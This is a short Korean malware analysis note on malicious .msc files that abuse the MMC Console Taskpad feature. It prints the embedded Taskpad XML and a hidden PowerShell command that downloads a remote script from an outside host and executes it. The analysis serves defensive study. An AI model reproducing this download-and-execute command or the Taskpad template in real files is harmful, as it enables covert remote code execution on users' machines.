## msc

Microsoft Management Console(mmc.exe)에 의해 실행되는 파일.

![](images/msc%20분석/IMG-msc%20분석-20240912113120127.png)

XML 파일 포맷 구조를 가지고 있어 내부를 확인할 수 있음.

![](images/msc%20분석/IMG-msc%20분석-20240912113201295.png)

악성코드는 MMC Console Taskpad 기능을 악용. 사용자가 특정 버튼을 클릭 시, 악성 스크립트를 실행.

[MMC Console Taskpad](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/mmc/mmc-console-taskpad)

![](images/msc%20분석/IMG-msc%20분석-20240912115210945.png)

## Analysis

### 1. 파일 내부를 확인

text 에디터를 사용하여 내부를 확인.

![](images/msc%20분석/IMG-msc%20분석-20240912113555178.png)

ConsoleTaskPads 부분을 확인.

```xml
  <ConsoleTaskpads>
    <ConsoleTaskpad ListSize="Medium" IsNodeSpecific="true" ReplacesDefaultView="true" NoResults="true" DescriptionsAsText="true" NodeType="{C96401CE-0E17-11D3-885B-00C04F72C717}" ID="{656F3A6A-1A63-4FC4-9C9B-4B75AF6DF3A3}">
      <String Name="Name" ID="4"/>
      <String Name="Description" Value=""/>
      <String Name="Tooltip" Value=""/>
      <Tasks>
        <Task Type="CommandLine" Command="powershell.exe">
          <String Name="Name" ID="5"/>
          <String Name="Description" ID="11"/>
          <Symbol>
            <Image Name="Small" BinaryRefIndex="6"/>
            <Image Name="Large" BinaryRefIndex="7"/>
          </Symbol>
          <CommandLine Directory="" WindowState="Minimized" Params="-WindowStyle Hidden -Command iex (iwr -Uri 'https://oshi.at/PTgX/jIML.txt' -UseBasicParsing)"/>
        </Task>
      </Tasks>
      <BookMark Name="TargetNode" NodeID="1"/>
    </ConsoleTaskpad>
  </ConsoleTaskpads>
```

powershell 관련 코드가 존재하는 것을 확인할 수 있음.

```powershell
powershell.exe -WindowStyle Hidden -Command iex (iwr -Uri 'https://oshi.at/PTgX/jIML.txt' -UseBasicParsing)
```

### 2. 악성코드 분석

jIML.txt 파일을 다운로드 받아 파일 내부에 있는 코드를 powsershell로 실행하는 코드.

```powershell
powershell.exe -WindowStyle Hidden -Command iex (iwr -Uri 'https://oshi.at/PTgX/jIML.txt' -UseBasicParsing)
```